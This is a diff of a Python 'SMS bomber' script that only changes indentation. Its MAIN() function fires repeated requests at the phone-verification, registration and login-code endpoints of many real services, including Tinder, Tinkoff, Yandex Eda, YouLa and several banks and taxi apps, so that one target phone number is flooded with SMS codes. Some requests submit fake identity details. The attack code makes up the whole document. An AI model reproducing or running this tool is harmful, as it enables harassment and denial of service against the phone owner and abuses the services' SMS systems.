@@ -667,37 +667,37 @@ def MAIN():
 						requests.post("https://apteka.ru/_action/auth/getForm/",data={"form[NAME]": "","form[PERSONAL_GENDER]": "","form[PERSONAL_BIRTHDAY]": "","form[EMAIL]": "","form[LOGIN]": phonee,"form[PASSWORD]": password,"get-new-password": "Получите пароль по SMS","user_agreement": "on","personal_data_agreement": "on","formType": "simple","utc_offset": "120"})
 					except:
                         			pass
-                    try:
-                        requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
-                    except:
+					try:
+						requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
+                    			except:
                         			
                         			pass
-                    try:
-                        requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
+                    			try:
+                        			requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
 					except:
                         			pass
-                    try:
+					try:
 						requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
 					except:
-                                    pass
-                    try:
-                        requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
-                    except:
+						pass
+					try:
+						requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
+					except:
 						
                         			pass
 					try:
 						requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
 					except:
                         			pass
-                    try:
+					try:
 						requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
 					except:
                         			pass
 					try:
 						requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
 					except:
-                                    pass
-                    try:
+						pass
+					try:
 						requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
 					except:
                         			pass
@@ -723,7 +723,7 @@ def MAIN():
                         			pass
 					try:
 						requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en')
-                    except:
+					except:
                         			pass
 					try:
 						requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': '+7 915 3509908','g-recaptcha-response': '','recaptcha': 'on'})
@@ -801,7 +801,7 @@ def MAIN():
 						requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': self.formatted_phone},headers={'App-ID': 'cabinet'})
 					except:
                         			pass
-                    try:
+					try:
 						requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": self.formatted_phone, "type": 2})
 					except:
                         			pass
@@ -811,7 +811,7 @@ def MAIN():
                         			pass
 					try:
 						requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': self.formatted_phone})
-                    except:
+					except:
                         			pass
 					try:
 						requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json={"client_type": "personal", "email": f"{email}@gmail.ru","mobile_phone": self.formatted_phone, "deliveryOption": "sms"})
@@ -831,7 +831,7 @@ def MAIN():
                         			pass
 					try:
 						requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone", "variables": {"phone": self.formatted_phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
-                    except:
+					except:
                         			pass
 					try:
 						requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone})
@@ -874,11 +874,11 @@ def MAIN():
 					except:
                         			pass
 					try:
-                        requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'}) 
+						requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'}) 
 					except:
                         			pass
 					try:
-                        requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
+						requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
 					except:
                         			pass
 					try:
@@ -927,7 +927,7 @@ def MAIN():
                         			pass
 					try:
 						requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
-                    except:
+					except:
                         			pass
 					try:
 						requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+' + self.formatted_phone})
@@ -975,7 +975,7 @@ def MAIN():
                         			pass
 					try:
 						requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + _phone})
-                    except:
+					except:
                         			pass
 					try:
 						requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
